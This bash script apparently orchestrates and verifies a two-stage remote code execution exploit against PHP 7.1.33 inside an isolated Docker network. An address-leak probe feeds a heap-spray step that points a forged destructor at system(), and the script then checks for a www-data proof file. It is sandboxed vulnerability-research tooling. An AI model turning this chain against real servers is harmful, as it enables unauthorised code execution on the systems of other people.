#!/usr/bin/env bash
set -Eeuo pipefail

if (( $# != 1 )) || [[ ! $1 =~ ^[A-Za-z0-9_.-]+$ ]]; then
  echo 'usage: run-http-only.sh LABEL' >&2
  exit 64
fi

readonly LABEL=$1
readonly HERE="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
readonly HARNESS="$(cd -- "$HERE/../../multiversion" && pwd)"
readonly RESULTS="$HERE/results"
readonly OUT="$RESULTS/$LABEL"
readonly CHAIN_LABEL="$LABEL-disclosure"
readonly CHAIN_OUT="$RESULTS/$CHAIN_LABEL"
readonly IMAGE='mirror.gcr.io/library/php@sha256:70eefcf4372b279101259e905996b7733a87688d0b48625af01b55947836bb1f'
readonly IMAGE_ID='sha256:b9858ffdd4d259fe208b6e5e4ae08f90c815dda98a7a8a45f3bf147485afaf4c'
readonly ATTACKER='python@sha256:a0f57064cbdcd6285fa45f51237ab0b35ea8ebaed06a1f5973e89e19dfb86704'
readonly ATTACKER_ID='sha256:a33c10a97f11005523814c6eee013986119fe41f3122f444518117536675c8e1'
readonly TARGET="p71-http-$LABEL-target"
readonly NETWORK="p71-http-$LABEL-net"
readonly VOLUME="p71-http-$LABEL-proof"

if command -v docker >/dev/null 2>&1; then DOCKER="$(command -v docker)";
elif [[ -x /snap/bin/docker ]]; then DOCKER=/snap/bin/docker;
else echo 'docker CLI was not found' >&2; exit 69; fi
readonly DOCKER

test "$($DOCKER image inspect "$IMAGE" --format '{{.Id}}')" = "$IMAGE_ID"
test "$($DOCKER image inspect "$ATTACKER" --format '{{.Id}}')" = "$ATTACKER_ID"
test ! -e "$OUT"
test ! -e "$CHAIN_OUT"
mkdir -p "$OUT" "$RESULTS"
chmod 0777 "$RESULTS"

cleanup() {
  set +e
  $DOCKER top "$TARGET" -eo pid,ppid,user,comm >"$OUT/docker-top.txt" 2>&1
  $DOCKER logs "$TARGET" >"$OUT/target.log" 2>&1
  $DOCKER inspect "$TARGET" >"$OUT/target.inspect.json" 2>/dev/null
  $DOCKER network inspect "$NETWORK" >"$OUT/network.inspect.json" 2>/dev/null
  $DOCKER rm -f "$TARGET" >/dev/null 2>&1
  $DOCKER network rm "$NETWORK" >/dev/null 2>&1
  $DOCKER volume rm "$VOLUME" >/dev/null 2>&1
}
trap cleanup EXIT

$DOCKER network create --internal --label org.php2shell.purpose=isolated-research "$NETWORK" >/dev/null
$DOCKER volume create --label org.php2shell.purpose=fixed-proof "$VOLUME" >/dev/null
$DOCKER create --name "$TARGET" --network "$NETWORK" \
  --network-alias target --network-alias php2shell-71-target \
  --security-opt no-new-privileges:true --pids-limit 64 --memory 512m \
  --tmpfs /tmp:rw,nosuid,nodev,size=128m \
  --mount "type=bind,src=$HERE/php108.ini,dst=/usr/local/etc/php/conf.d/zz-php71-http.ini,readonly" \
  --mount "type=bind,src=$HERE/apache.conf,dst=/etc/apache2/conf-enabled/zz-php71-http.conf,readonly" \
  --mount "type=bind,src=$HERE/terminal-route71.conf,dst=/etc/apache2/conf-enabled/zz-terminal-route71.conf,readonly" \
  --mount "type=bind,src=$HERE/index.php,dst=/var/www/html/index.php,readonly" \
  --mount "type=bind,src=$HERE/index-terminal.php,dst=/var/www/html/terminal.php,readonly" \
  --mount "type=volume,src=$VOLUME,dst=/out" \
  "$IMAGE" sh -eu -c 'chown www-data:www-data /out; chmod 0770 /out; rm -f /out/p; exec apache2-foreground' >/dev/null
$DOCKER start "$TARGET" >/dev/null
sleep 1
test "$($DOCKER exec "$TARGET" php -r 'echo PHP_VERSION;')" = 7.1.33
test "$($DOCKER inspect "$TARGET" --format '{{json .HostConfig.PortBindings}}')" = '{}'
test "$($DOCKER network inspect "$NETWORK" --format '{{.Internal}}')" = true
worker_before="$($DOCKER top "$TARGET" -eo pid,ppid,user,comm | awk '$3 == "www-data" && $4 == "apache2" {print $1; exit}')"
test -n "$worker_before"

$DOCKER run --rm --network "$NETWORK" --read-only --user 65532:65532 \
  --security-opt no-new-privileges:true --cap-drop ALL --pids-limit 64 --memory 512m \
  --tmpfs /tmp:rw,nosuid,nodev,size=64m \
  --mount "type=bind,src=$HARNESS,dst=/harness,readonly" \
  --mount "type=bind,src=$HERE,dst=/probe,readonly" \
  --mount "type=bind,src=$RESULTS,dst=/results" \
  --workdir /probe "$ATTACKER" python3 /probe/probe71.py \
  --label "$CHAIN_LABEL" --filename-len 208880 --b1-target-offset 0xb0ee0 \
  --b1-forged-pages 294 --b1-fake-len 0x400000 >"$OUT/a1b1.log" 2>&1

worker_after_b1="$($DOCKER top "$TARGET" -eo pid,ppid,user,comm | awk '$3 == "www-data" && $4 == "apache2" {print $1; exit}')"
test "$worker_after_b1" = "$worker_before"
python3 "$HERE/analyze_b1_71.py" "$CHAIN_OUT/b1.leak" \
  --output "$OUT/http-derived-addresses.json" >"$OUT/address-analysis.log"
main_http="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["main_chunk"])' "$OUT/http-derived-addresses.json")"
system_http="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["system"])' "$OUT/http-derived-addresses.json")"

set +e
$DOCKER run --rm --network "$NETWORK" --read-only --user 65532:65532 \
  --security-opt no-new-privileges:true --cap-drop ALL --pids-limit 64 --memory 256m \
  --tmpfs /tmp:rw,noexec,nosuid,nodev,size=32m \
  --mount "type=bind,src=$HERE,dst=/terminal,readonly" \
  "$ATTACKER" python3 /terminal/sequence71_fake.py \
  --path /terminal.php --producer-pads 32 --producer-files 1 --skip-b --third \
  --third-sid-len 31 --third-header-seed-len 0 \
  --third-header-spray-count 49 --third-header-key-len 31 \
  --third-header-target-value-len 1 --third-header-fill-all \
  --third-fake-main "$main_http" --third-fake-pdestructor "$system_http" \
  --third-ref-page-offset 0x65000 --third-donor-offset 0x6a098 \
  --third-command-bucket --third-swap-carriers --third-detached-fake --delay 0.25 \
  >"$OUT/terminal.log" 2>&1
client_rc=$?
set -e
printf '%s\n' "$client_rc" >"$OUT/client.exit"
worker_after_terminal="$($DOCKER top "$TARGET" -eo pid,ppid,user,comm | awk '$3 == "www-data" && $4 == "apache2" {print $1; exit}' || true)"
printf 'address_source=http-b1\nworker_before=%s\nworker_after_b1=%s\nworker_after_terminal=%s\n' \
  "$worker_before" "$worker_after_b1" "$worker_after_terminal" >"$OUT/invariants.txt"
$DOCKER cp "$TARGET:/out/p" "$OUT/proof.txt" >/dev/null 2>&1 || echo NO_PROOF >"$OUT/proof.txt"
cat "$CHAIN_OUT/summary.json"
cat "$OUT/http-derived-addresses.json"
cat "$OUT/terminal.log"
cat "$OUT/proof.txt"
grep -Eq '^uid=33\(www-data\) gid=33\(www-data\)' "$OUT/proof.txt"
